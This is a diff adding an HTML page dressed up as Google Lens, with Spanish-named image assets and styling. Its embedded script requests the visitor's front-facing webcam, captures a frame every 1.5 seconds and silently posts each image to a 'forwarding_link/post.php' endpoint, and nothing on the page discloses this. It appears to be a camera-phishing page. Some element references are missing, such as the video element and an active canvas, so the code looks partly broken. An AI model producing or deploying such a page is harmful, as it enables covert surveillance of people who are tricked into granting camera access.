@@ -1,0 +1,155 @@
+<!doctype html>
+<html>
+
+<head>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+<!--<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center> -->
+
+
+
+<script>
+
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: 'forwarding_link/post.php',
+      dataType: 'json',
+      async: false,
+      success: function (result) {
+        // call the function that handles the response/results
+      },
+      error: function () {
+      }
+    });
+  };
+
+
+  'use strict';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const errorMsgElement = document.querySelector('span#errorMsg');
+
+  const constraints = {
+    audio: false,
+    video: {
+
+      facingMode: "user"
+    }
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+  }
+
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function () {
+
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      post(canvasData);
+      video.play();
+    }, 1500);
+
+
+  }
+  function PopUp(){
+    document.getElementById('ac-wrapper').style.display="none"; 
+}
+  // Load init
+  init();
+  $(document).ready(function(){
+   setTimeout(function(){
+      PopUp();
+   },50000); // 5000 to load it after 5 seconds from page load
+});
+</script>
+
+
+<style>
+  body {
+    background-color: #000000;
+    color: #fff;
+  }
+
+.contSup{
+   display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 20px;
+  padding: 20px;
+}
+.flecha{
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.titulo{
+    flex: 1 1 200px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.lupaaa{
+    display: grid;
+    place-items: center; 
+}
+/*#popup {
+    width: 555px;
+    height: 35px;
+    background: #FFFFFF;
+    border: 5px solid #000;
+    border-radius: 15px;
+    -moz-border-radius: 15px;
+    -webkit-border-radius: 15px;
+    box-shadow: #64686e 0px 0px 3px 3px;
+    -moz-box-shadow: #64686e 0px 0px 3px 3px;
+    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
+    position: relative;
+    top: 250px; left: 375px;
+}*/
+
+
+</style>
+
+
+<body>
+  <div class="contSup">
+    <div class="flecha">
+        <img src="imagenes/flechitaNueva.png" alt="" height="80" width="80">
+    </div>
+    <div class="titulo">
+        <img src="imagenes/googlelens.jpg" alt="">
+    </div>
+    <div class="flecha">
+        <img src="imagenes/puntosNuevos.png" alt="" height="80" width="80">
+    </div>
+  </div>
+
+
+    <div class="lupaaa">
+        <img src="imagenes/cosas.jpg" alt="">
+        <img src="imagenes/lupa.jpg" style=" border-radius: 100px; border: 6px solid #ffffffbd;" height="180" width="180">
+        <img src="imagenes/BuscarTraducir.jpg" alt="">
+
+    </div>
+
+
+</body>
+
+</html>
